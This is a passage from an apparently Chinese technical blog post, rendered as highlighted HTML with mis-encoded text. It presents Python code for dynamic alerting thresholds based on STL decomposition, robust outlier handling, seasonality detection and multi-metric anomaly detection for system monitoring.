            <span class="hljs-string">'trend'</span>: decomposition[<span class="hljs-string">'trend_direction'</span>],
            <span class="hljs-string">'seasonality_factor'</span>: decomposition[<span class="hljs-string">'seasonal_factor'</span>]
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_perform_stl_decomposition</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ‰§è¡ŒSTLæ—¶é—´åºåˆ—åˆ†è§£"""</span>
        <span class="hljs-comment"># æå–æ—¶é—´åºåˆ—å€¼</span>
        values = np.array([point[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> point <span class="hljs-keyword">in</span> self.history])
        
        <span class="hljs-comment"># å¤„ç†ç¼ºå¤±å€¼å’Œå¼‚å¸¸å€¼</span>
        values = self._preprocess_series(values)
        
        <span class="hljs-comment"># STLåˆ†è§£</span>
        stl = STL(
            values, 
            seasonal=self.seasonal_period,
            trend=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># è‡ªåŠ¨é€‰æ‹©è¶‹åŠ¿çª—å£</span>
            robust=<span class="hljs-literal">True</span>  <span class="hljs-comment"># ä½¿ç”¨é²æ£’æ€§æ‹Ÿåˆï¼Œå¯¹å¼‚å¸¸å€¼ä¸æ•æ„Ÿ</span>
        )
        result = stl.fit()
        
        <span class="hljs-comment"># æå–å„ç»„æˆéƒ¨åˆ†</span>
        trend = result.trend
        seasonal = result.seasonal
        residual = result.resid
        
        <span class="hljs-comment"># è®¡ç®—æ®‹å·®ç»Ÿè®¡é‡</span>
        residual_std = np.std(residual)
        residual_mean = np.mean(residual)
        
        <span class="hljs-comment"># åˆ¤æ–­è¶‹åŠ¿æ–¹å‘</span>
        trend_direction = self._analyze_trend(trend)
        
        <span class="hljs-comment"># è®¡ç®—å­£èŠ‚æ€§å› å­ï¼ˆå½“å‰æ—¶åˆ»çš„å­£èŠ‚æ€§å¼ºåº¦ï¼‰</span>
        seasonal_factor = seasonal[-<span class="hljs-number">1</span>] / np.mean(np.<span class="hljs-built_in">abs</span>(seasonal))
        
        decomposition = {
            <span class="hljs-string">'trend'</span>: trend,
            <span class="hljs-string">'seasonal'</span>: seasonal,
            <span class="hljs-string">'residual'</span>: residual,
            <span class="hljs-string">'residual_std'</span>: residual_std,
            <span class="hljs-string">'residual_mean'</span>: residual_mean,
            <span class="hljs-string">'trend_direction'</span>: trend_direction,
            <span class="hljs-string">'seasonal_factor'</span>: seasonal_factor,
            <span class="hljs-string">'current_trend'</span>: trend[-<span class="hljs-number">1</span>],
            <span class="hljs-string">'current_seasonal'</span>: seasonal[-<span class="hljs-number">1</span>]
        }
        
        self.last_decomposition = decomposition
        <span class="hljs-keyword">return</span> decomposition
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_dynamic_thresholds</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""è®¡ç®—åŠ¨æ€é˜ˆå€¼"""</span>
        <span class="hljs-comment"># é¢„æœŸå€¼ = è¶‹åŠ¿ + å­£èŠ‚æ€§</span>
        expected_value = (
            decomposition[<span class="hljs-string">'current_trend'</span>] + 
            decomposition[<span class="hljs-string">'current_seasonal'</span>]
        )
        
        <span class="hljs-comment"># åŠ¨æ€æ³¢åŠ¨èŒƒå›´ = sigma_multiplier Ã— æ®‹å·®æ ‡å‡†å·®</span>
        dynamic_range = (
            self.sigma_multiplier * 
            decomposition[<span class="hljs-string">'residual_std'</span>]
        )
        
        <span class="hljs-comment"># è€ƒè™‘è¶‹åŠ¿æ–¹å‘çš„è‡ªé€‚åº”è°ƒæ•´</span>
        <span class="hljs-keyword">if</span> decomposition[<span class="hljs-string">'trend_direction'</span>] == <span class="hljs-string">'increasing'</span>:
            <span class="hljs-comment"># ä¸Šå‡è¶‹åŠ¿ï¼šæ”¾å®½ä¸Šç•Œï¼Œæ”¶ç´§ä¸‹ç•Œ</span>
            upper_bound = expected_value + dynamic_range * <span class="hljs-number">1.2</span>
            lower_bound = expected_value - dynamic_range * <span class="hljs-number">0.8</span>
        <span class="hljs-keyword">elif</span> decomposition[<span class="hljs-string">'trend_direction'</span>] == <span class="hljs-string">'decreasing'</span>:
            <span class="hljs-comment"># ä¸‹é™è¶‹åŠ¿ï¼šæ”¶ç´§ä¸Šç•Œï¼Œæ”¾å®½ä¸‹ç•Œ</span>
            upper_bound = expected_value + dynamic_range * <span class="hljs-number">0.8</span>
            lower_bound = expected_value - dynamic_range * <span class="hljs-number">1.2</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># å¹³ç¨³è¶‹åŠ¿ï¼šå¯¹ç§°é˜ˆå€¼</span>
            upper_bound = expected_value + dynamic_range
            lower_bound = expected_value - dynamic_range
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'expected'</span>: expected_value,
            <span class="hljs-string">'upper'</span>: upper_bound,
            <span class="hljs-string">'lower'</span>: lower_bound,
            <span class="hljs-string">'dynamic_range'</span>: dynamic_range
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_detect_anomaly</span>(<span class="hljs-params">self, current_value, thresholds, decomposition</span>):
        <span class="hljs-string">"""
        å¤šç»´åº¦å¼‚å¸¸æ£€æµ‹
        
        æ£€æµ‹ç»´åº¦ï¼š
        1. é˜ˆå€¼çªç ´æ£€æµ‹
        2. è¿ç»­åç¦»æ£€æµ‹
        3. çªå˜æ£€æµ‹
        """</span>
        is_alert = <span class="hljs-literal">False</span>
        alert_type = <span class="hljs-literal">None</span>
        
        <span class="hljs-comment"># ç»´åº¦1ï¼šåŸºç¡€é˜ˆå€¼æ£€æµ‹</span>
        <span class="hljs-keyword">if</span> current_value &gt; thresholds[<span class="hljs-string">'upper'</span>]:
            is_alert = <span class="hljs-literal">True</span>
            alert_type = <span class="hljs-string">'upper_breach'</span>
        <span class="hljs-keyword">elif</span> current_value &lt; thresholds[<span class="hljs-string">'lower'</span>]:
            is_alert = <span class="hljs-literal">True</span>
            alert_type = <span class="hljs-string">'lower_breach'</span>
        
        <span class="hljs-comment"># ç»´åº¦2ï¼šè¿ç»­åç¦»æ£€æµ‹ï¼ˆæœ€è¿‘3ä¸ªç‚¹éƒ½åç¦»ï¼‰</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &gt;= <span class="hljs-number">3</span>:
            recent_values = [p[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(self.history)[-<span class="hljs-number">3</span>:]]
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(v &gt; thresholds[<span class="hljs-string">'expected'</span>] * <span class="hljs-number">1.1</span> <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> recent_values):
                is_alert = <span class="hljs-literal">True</span>
                alert_type = <span class="hljs-string">'sustained_high'</span>
        
        <span class="hljs-comment"># ç»´åº¦3ï¼šçªå˜æ£€æµ‹ï¼ˆç›¸å¯¹äºå‰ä¸€ä¸ªç‚¹å˜åŒ–è¶…è¿‡50%ï¼‰</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.history) &gt;= <span class="hljs-number">2</span>:
            prev_value = <span class="hljs-built_in">list</span>(self.history)[-<span class="hljs-number">2</span>][<span class="hljs-string">'value'</span>]
            change_rate = <span class="hljs-built_in">abs</span>(current_value - prev_value) / prev_value
            <span class="hljs-keyword">if</span> change_rate &gt; <span class="hljs-number">0.5</span>:
                is_alert = <span class="hljs-literal">True</span>
                alert_type = <span class="hljs-string">'sudden_change'</span>
        
        <span class="hljs-keyword">return</span> is_alert, alert_type
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_confidence</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""
        è®¡ç®—ç½®ä¿¡åº¦
        
        ç½®ä¿¡åº¦è¶Šé«˜ï¼Œè¯´æ˜ï¼š
        1. å†å²æ•°æ®è¶Šå……è¶³
        2. æ¨¡å¼è¶Šç¨³å®šï¼ˆæ®‹å·®è¶Šå°ï¼‰
        3. å­£èŠ‚æ€§è¶Šæ˜æ˜¾
        """</span>
        <span class="hljs-comment"># å› å­1ï¼šæ•°æ®å……è¶³åº¦ï¼ˆ0-1ï¼‰</span>
        data_sufficiency = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(self.history) / self.window_size, <span class="hljs-number">1.0</span>)
        
        <span class="hljs-comment"># å› å­2ï¼šæ¨¡å¼ç¨³å®šæ€§ï¼ˆ0-1ï¼‰</span>
        <span class="hljs-comment"># æ®‹å·®æ ‡å‡†å·®è¶Šå°ï¼Œç¨³å®šæ€§è¶Šé«˜</span>
        residual_cv = (
            decomposition[<span class="hljs-string">'residual_std'</span>] / 
            (<span class="hljs-built_in">abs</span>(decomposition[<span class="hljs-string">'current_trend'</span>]) + <span class="hljs-number">1e-6</span>)
        )
        pattern_stability = <span class="hljs-number">1.0</span> / (<span class="hljs-number">1.0</span> + residual_cv)
        
        <span class="hljs-comment"># å› å­3ï¼šå­£èŠ‚æ€§å¼ºåº¦ï¼ˆ0-1ï¼‰</span>
        seasonal_strength = <span class="hljs-built_in">min</span>(
            <span class="hljs-built_in">abs</span>(decomposition[<span class="hljs-string">'seasonal_factor'</span>]), 
            <span class="hljs-number">1.0</span>
        )
        
        <span class="hljs-comment"># ç»¼åˆç½®ä¿¡åº¦ï¼ˆåŠ æƒå¹³å‡ï¼‰</span>
        confidence = (
            <span class="hljs-number">0.4</span> * data_sufficiency +
            <span class="hljs-number">0.4</span> * pattern_stability +
            <span class="hljs-number">0.2</span> * seasonal_strength
        )
        
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(confidence, <span class="hljs-number">3</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_analyze_trend</span>(<span class="hljs-params">self, trend</span>):
        <span class="hljs-string">"""åˆ†æè¶‹åŠ¿æ–¹å‘"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(trend) &lt; <span class="hljs-number">24</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'stable'</span>
        
        <span class="hljs-comment"># æ¯”è¾ƒæœ€è¿‘24å°æ—¶çš„è¶‹åŠ¿</span>
        recent_trend = trend[-<span class="hljs-number">24</span>:]
        slope = np.polyfit(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(recent_trend)), recent_trend, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]
        
        <span class="hljs-comment"># ç›¸å¯¹å˜åŒ–ç‡</span>
        relative_slope = slope / (np.mean(recent_trend) + <span class="hljs-number">1e-6</span>)
        
        <span class="hljs-keyword">if</span> relative_slope &gt; <span class="hljs-number">0.01</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'increasing'</span>
        <span class="hljs-keyword">elif</span> relative_slope &lt; -<span class="hljs-number">0.01</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'decreasing'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'stable'</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_deviation_percentage</span>(<span class="hljs-params">self, current, expected</span>):
        <span class="hljs-string">"""è®¡ç®—åç¦»ç™¾åˆ†æ¯”"""</span>
        <span class="hljs-keyword">if</span> expected == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">round</span>(((current - expected) / expected) * <span class="hljs-number">100</span>, <span class="hljs-number">2</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_preprocess_series</span>(<span class="hljs-params">self, values</span>):
        <span class="hljs-string">"""é¢„å¤„ç†æ—¶é—´åºåˆ—"""</span>
        <span class="hljs-comment"># å¤„ç†ç¼ºå¤±å€¼ï¼ˆçº¿æ€§æ’å€¼ï¼‰</span>
        values = pd.Series(values).interpolate(method=<span class="hljs-string">'linear'</span>).values
        
        <span class="hljs-comment"># å¤„ç†å¼‚å¸¸å€¼ï¼ˆä½¿ç”¨ä¸­ä½æ•°ç»å¯¹åå·®MADæ–¹æ³•ï¼‰</span>
        median = np.median(values)
        mad = np.median(np.<span class="hljs-built_in">abs</span>(values - median))
        threshold = <span class="hljs-number">3</span> * mad
        
        <span class="hljs-comment"># å°†å¼‚å¸¸å€¼æ›¿æ¢ä¸ºä¸­ä½æ•°</span>
        values = np.where(
            np.<span class="hljs-built_in">abs</span>(values - median) &gt; threshold,
            median,
            values
        )
        
        <span class="hljs-keyword">return</span> values
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_validate_data</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ•°æ®éªŒè¯"""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> np.isnan(value) <span class="hljs-keyword">or</span> np.isinf(value):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_default_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ— æ•ˆæ•°æ®çš„é»˜è®¤å“åº”"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'invalid_data'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_bootstrap_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""æ•°æ®ä¸è¶³æ—¶çš„å“åº”"""</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'current_value'</span>: value,
            <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'bootstrapping'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>,
            <span class="hljs-string">'message'</span>: <span class="hljs-string">f'éœ€è¦è‡³å°‘<span class="hljs-subst">{self.min_samples}</span>ä¸ªæ•°æ®ç‚¹'</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_fallback_response</span>(<span class="hljs-params">self, value</span>):
        <span class="hljs-string">"""åˆ†è§£å¤±è´¥æ—¶çš„é™çº§å“åº”"""</span>
        <span class="hljs-comment"># ä½¿ç”¨ç®€å•çš„ç§»åŠ¨å¹³å‡ä½œä¸ºé™çº§æ–¹æ¡ˆ</span>
        values = [p[<span class="hljs-string">'value'</span>] <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.history]
        mean = np.mean(values)
        std = np.std(values)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'current_value'</span>: value,
            <span class="hljs-string">'upper_bound'</span>: mean + <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'lower_bound'</span>: mean - <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'is_alert'</span>: value &gt; mean + <span class="hljs-number">3</span> * std <span class="hljs-keyword">or</span> value &lt; mean - <span class="hljs-number">3</span> * std,
            <span class="hljs-string">'alert_type'</span>: <span class="hljs-string">'fallback_mode'</span>,
            <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.5</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_statistics</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è·å–ç»Ÿè®¡ä¿¡æ¯"""</span>
        <span class="hljs-keyword">if</span> self.stats[<span class="hljs-string">'total_points'</span>] &gt; <span class="hljs-number">0</span>:
            alert_rate = (
                self.stats[<span class="hljs-string">'alerts_triggered'</span>] / 
                self.stats[<span class="hljs-string">'total_points'</span>]
            )
        <span class="hljs-keyword">else</span>:
            alert_rate = <span class="hljs-number">0.0</span>
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'total_points'</span>: self.stats[<span class="hljs-string">'total_points'</span>],
            <span class="hljs-string">'alerts_triggered'</span>: self.stats[<span class="hljs-string">'alerts_triggered'</span>],
            <span class="hljs-string">'alert_rate'</span>: <span class="hljs-built_in">round</span>(alert_rate * <span class="hljs-number">100</span>, <span class="hljs-number">2</span>)
        }
</code></pre>
<p>3.2.2 å®é™…ä½¿ç”¨ç¤ºä¾‹</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åˆå§‹åŒ–åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨</span>
<span class="hljs-attr">threshold_gen</span> = DynamicThresholdGenerator(
    <span class="hljs-attr">window_size</span>=<span class="hljs-number">168</span>,      <span class="hljs-comment"># 7å¤©æ•°æ®</span>
    <span class="hljs-attr">seasonal_period</span>=<span class="hljs-number">24</span>,   <span class="hljs-comment"># 24å°æ—¶å‘¨æœŸ</span>
    <span class="hljs-attr">sigma_multiplier</span>=<span class="hljs-number">3</span>,   <span class="hljs-comment"># 3Ïƒ</span>
    <span class="hljs-attr">min_samples</span>=<span class="hljs-number">48</span>        <span class="hljs-comment"># è‡³å°‘2å¤©æ•°æ®</span>
)

<span class="hljs-comment"># æ¨¡æ‹Ÿå®æ—¶æ•°æ®æµ</span>
import random
from datetime import datetime, timedelta

<span class="hljs-attr">base_time</span> = datetime.now() - timedelta(days=<span class="hljs-number">7</span>)

for hour in range(168):  <span class="hljs-comment"># 7å¤©æ•°æ®</span>
    <span class="hljs-attr">timestamp</span> = base_time + timedelta(hours=hour)
    
    <span class="hljs-comment"># æ¨¡æ‹ŸçœŸå®ä¸šåŠ¡æ•°æ®ï¼š</span>
    <span class="hljs-comment"># åŸºç¡€è´Ÿè½½ + æ—¥å‘¨æœŸ + å‘¨å‘¨æœŸ + éšæœºå™ªå£°</span>
    <span class="hljs-attr">base_load</span> = <span class="hljs-number">50</span>
    <span class="hljs-attr">daily_pattern</span> = <span class="hljs-number">20</span> * np.sin(<span class="hljs-number">2</span> * np.pi * hour / <span class="hljs-number">24</span>)
    <span class="hljs-attr">weekly_pattern</span> = <span class="hljs-number">10</span> * np.sin(<span class="hljs-number">2</span> * np.pi * hour / <span class="hljs-number">168</span>)
    <span class="hljs-attr">noise</span> = random.gauss(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)
    
    <span class="hljs-attr">cpu_usage</span> = base_load + daily_pattern + weekly_pattern + noise
    
    <span class="hljs-comment"># æ›´æ–°é˜ˆå€¼å¹¶è·å–ç»“æœ</span>
    <span class="hljs-attr">result</span> = threshold_gen.update_and_get_thresholds(cpu_usage, timestamp)
    
    <span class="hljs-comment"># å¦‚æœè§¦å‘å‘Šè­¦ï¼Œæ‰“å°è¯¦ç»†ä¿¡æ¯</span>
    if result<span class="hljs-section">['is_alert']</span>:
        print(f"""
        âš ï¸  å‘Šè­¦è§¦å‘ï¼
        æ—¶é—´: {result<span class="hljs-section">['timestamp']</span>}
        å½“å‰å€¼: {result<span class="hljs-section">['current_value']</span>:.2f}%
        é¢„æœŸå€¼: {result<span class="hljs-section">['expected_value']</span>:.2f}%
        ä¸Šç•Œ: {result<span class="hljs-section">['upper_bound']</span>:.2f}%
        ä¸‹ç•Œ: {result<span class="hljs-section">['lower_bound']</span>:.2f}%
        åç¦»åº¦: {result<span class="hljs-section">['deviation_percentage']</span>}%
        å‘Šè­¦ç±»å‹: {result<span class="hljs-section">['alert_type']</span>}
        ç½®ä¿¡åº¦: {result<span class="hljs-section">['confidence']</span>}
        è¶‹åŠ¿: {result<span class="hljs-section">['trend']</span>}
        """)

<span class="hljs-comment"># æ‰“å°ç»Ÿè®¡ä¿¡æ¯</span>
<span class="hljs-attr">stats</span> = threshold_gen.get_statistics()
print(f"\nç»Ÿè®¡ä¿¡æ¯ï¼š")
print(f"æ€»æ•°æ®ç‚¹: {stats<span class="hljs-section">['total_points']</span>}")
print(f"å‘Šè­¦æ¬¡æ•°: {stats<span class="hljs-section">['alerts_triggered']</span>}")
print(f"å‘Šè­¦ç‡: {stats<span class="hljs-section">['alert_rate']</span>}%")
</code></pre>
<h3 data-id="heading-11">3.3 å…³é”®æŠ€æœ¯ç»†èŠ‚è§£æ</h3>
<h3 data-id="heading-12">3.3.1 æ»‘åŠ¨çª—å£çš„é€‰æ‹©</h3>
<p>çª—å£å¤§å°çš„æƒè¡¡ï¼š</p>
<ul>
<li>å¤ªå°ï¼ˆå¦‚24å°æ—¶ï¼‰ï¼šæ— æ³•æ•æ‰å‘¨å‘¨æœŸï¼Œå¯¹çªå‘äº‹ä»¶æ•æ„Ÿåº¦è¿‡é«˜</li>
<li>å¤ªå¤§ï¼ˆå¦‚30å¤©ï¼‰ï¼šå“åº”é€Ÿåº¦æ…¢ï¼Œæ— æ³•å¿«é€Ÿé€‚åº”ä¸šåŠ¡å˜åŒ–</li>
<li>æ¨èï¼š7å¤©ï¼ˆ168å°æ—¶ï¼‰æ˜¯ä¸€ä¸ªå¹³è¡¡ç‚¹</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># ä¸åŒä¸šåŠ¡åœºæ™¯çš„çª—å£é…ç½®</span>
<span class="hljs-string">WINDOW_CONFIGS</span> <span class="hljs-string">=</span> {
    <span class="hljs-attr">'high_frequency_trading':</span> <span class="hljs-number">24</span>,      <span class="hljs-comment"># é«˜é¢‘äº¤æ˜“ï¼š1å¤©</span>
    <span class="hljs-attr">'web_service':</span> <span class="hljs-number">168</span>,                <span class="hljs-comment"># WebæœåŠ¡ï¼š7å¤©</span>
    <span class="hljs-attr">'batch_processing':</span> <span class="hljs-number">720</span>,           <span class="hljs-comment"># æ‰¹å¤„ç†ï¼š30å¤©</span>
    <span class="hljs-attr">'iot_sensor':</span> <span class="hljs-number">8760</span>                 <span class="hljs-comment"># IoTä¼ æ„Ÿå™¨ï¼š1å¹´</span>
}
</code></pre>
<h3 data-id="heading-13">3.3.2 å­£èŠ‚å‘¨æœŸçš„è¯†åˆ«</h3>
<p>è‡ªåŠ¨å‘¨æœŸæ£€æµ‹ï¼ˆä½¿ç”¨è‡ªç›¸å…³å‡½æ•°ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> statsmodels.tsa.stattools <span class="hljs-keyword">import</span> acf

<span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_detect_seasonality</span>(<span class="hljs-params">values, max_lag=<span class="hljs-number">168</span></span>):
    <span class="hljs-string">"""è‡ªåŠ¨æ£€æµ‹å­£èŠ‚å‘¨æœŸ"""</span>
    <span class="hljs-comment"># è®¡ç®—è‡ªç›¸å…³ç³»æ•°</span>
    acf_values = acf(values, nlags=max_lag)
    
    <span class="hljs-comment"># å¯»æ‰¾ç¬¬ä¸€ä¸ªæ˜¾è‘—çš„å³°å€¼ï¼ˆæ’é™¤lag=0ï¼‰</span>
    peaks = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(acf_values) - <span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> (acf_values[i] &gt; acf_values[i-<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> 
            acf_values[i] &gt; acf_values[i+<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span>
            acf_values[i] &gt; <span class="hljs-number">0.3</span>):  <span class="hljs-comment"># æ˜¾è‘—æ€§é˜ˆå€¼</span>
            peaks.append((i, acf_values[i]))
    
    <span class="hljs-keyword">if</span> peaks:
        <span class="hljs-comment"># è¿”å›æœ€æ˜¾è‘—çš„å‘¨æœŸ</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(peaks, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>])[<span class="hljs-number">0</span>]
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">24</span>  <span class="hljs-comment"># é»˜è®¤24å°æ—¶</span>
</code></pre>
<h3 data-id="heading-14">3.3.3 å¼‚å¸¸å€¼çš„é²æ£’å¤„ç†</h3>
<p>é—®é¢˜ï¼šå†å²æ•°æ®ä¸­çš„å¼‚å¸¸å€¼ä¼šæ±¡æŸ“æ¨¡å‹</p>
<p>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨MADï¼ˆMedian Absolute Deviationï¼‰æ–¹æ³•</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">robust_outlier_removal</span>(<span class="hljs-params">values</span>):
    <span class="hljs-string">"""é²æ£’çš„å¼‚å¸¸å€¼ç§»é™¤"""</span>
    median = np.median(values)
    mad = np.median(np.<span class="hljs-built_in">abs</span>(values - median))
    
    <span class="hljs-comment"># MADæ ‡å‡†åŒ–</span>
    modified_z_scores = <span class="hljs-number">0.6745</span> * (values - median) / mad
    
    <span class="hljs-comment"># æ ‡è®°å¼‚å¸¸å€¼ï¼ˆ|z| &gt; 3.5ï¼‰</span>
    outliers = np.<span class="hljs-built_in">abs</span>(modified_z_scores) &gt; <span class="hljs-number">3.5</span>
    
    <span class="hljs-comment"># ç”¨ä¸­ä½æ•°æ›¿æ¢å¼‚å¸¸å€¼</span>
    cleaned_values = values.copy()
    cleaned_values[outliers] = median
    
    <span class="hljs-keyword">return</span> cleaned_values, outliers
</code></pre>
<h2 data-id="heading-15">å››ã€è¿›é˜¶ä¼˜åŒ–ï¼šä»"èƒ½ç”¨"åˆ°"å¥½ç”¨"</h2>
<h3 data-id="heading-16">4.1 å¤šæŒ‡æ ‡è”åˆåˆ¤æ–­</h3>
<pre><code class="hljs language-python" lang="python">å•ä¸€æŒ‡æ ‡çš„å‘Šè­¦å®¹æ˜“è¯¯åˆ¤ï¼Œç»“åˆå¤šä¸ªç›¸å…³æŒ‡æ ‡å¯ä»¥æé«˜å‡†ç¡®æ€§ï¼š
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiMetricAnomalyDetector</span>:
    <span class="hljs-string">"""å¤šæŒ‡æ ‡è”åˆå¼‚å¸¸æ£€æµ‹"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.detectors = {
            <span class="hljs-string">'cpu'</span>: DynamicThresholdGenerator(),
            <span class="hljs-string">'memory'</span>: DynamicThresholdGenerator(),
            <span class="hljs-string">'response_time'</span>: DynamicThresholdGenerator()
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">detect</span>(<span class="hljs-params">self, metrics, timestamp</span>):
        <span class="hljs-string">"""
        è”åˆæ£€æµ‹é€»è¾‘ï¼š
        1. å•æŒ‡æ ‡å¼‚å¸¸ + ä½ç½®ä¿¡åº¦ â†’ ä¸å‘Šè­¦
        2. å¤šæŒ‡æ ‡åŒæ—¶å¼‚å¸¸ â†’ é«˜ä¼˜å…ˆçº§å‘Šè­¦
        3. å…³è”æŒ‡æ ‡å¼‚å¸¸ â†’ æ ¹å› åˆ†æ
        """</span>
        results = {}
        <span class="hljs-keyword">for</span> metric_name, value <span class="hljs-keyword">in</span> metrics.items():
            results[metric_name] = self.detectors[metric_name].update_and_get_thresholds(
                value, timestamp
            )
        
        <span class="hljs-comment"># è®¡ç®—è”åˆå‘Šè­¦åˆ†æ•°</span>
        alert_score = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> metric, result <span class="hljs-keyword">in</span> results.items():
            <span class="hljs-keyword">if</span> result[<span class="hljs-string">'is_alert'</span>]:
                alert_score += result[<span class="hljs-string">'confidence'</span>]
        
        <span class="hljs-comment"># å‘Šè­¦å†³ç­–</span>
        <span class="hljs-keyword">if</span> alert_score &gt; <span class="hljs-number">1.5</span>:  <span class="hljs-comment"># è‡³å°‘2ä¸ªé«˜ç½®ä¿¡åº¦æŒ‡æ ‡å¼‚å¸¸</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">True</span>,
                <span class="hljs-string">'severity'</span>: <span class="hljs-string">'critical'</span> <span class="hljs-keyword">if</span> alert_score &gt; <span class="hljs-number">2.5</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'warning'</span>,
                <span class="hljs-string">'details'</span>: results,
                <span class="hljs-string">'root_cause'</span>: self._analyze_root_cause(results)
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_analyze_root_cause</span>(<span class="hljs-params">self, results</span>):
        <span class="hljs-string">"""ç®€å•çš„æ ¹å› åˆ†æ"""</span>
        <span class="hljs-keyword">if</span> results[<span class="hljs-string">'cpu'</span>][<span class="hljs-string">'is_alert'</span>] <span class="hljs-keyword">and</span> results[<span class="hljs-string">'response_time'</span>][<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'CPUç“¶é¢ˆå¯¼è‡´å“åº”æ—¶é—´ä¸Šå‡'</span>
        <span class="hljs-keyword">elif</span> results[<span class="hljs-string">'memory'</span>][<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'å†…å­˜æ³„æ¼æˆ–å†…å­˜ä¸è¶³'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'æœªçŸ¥åŸå› '</span>
</code></pre>
<h3 data-id="heading-17">4.2 å‘Šè­¦æŠ‘åˆ¶ä¸èšåˆ</h3>
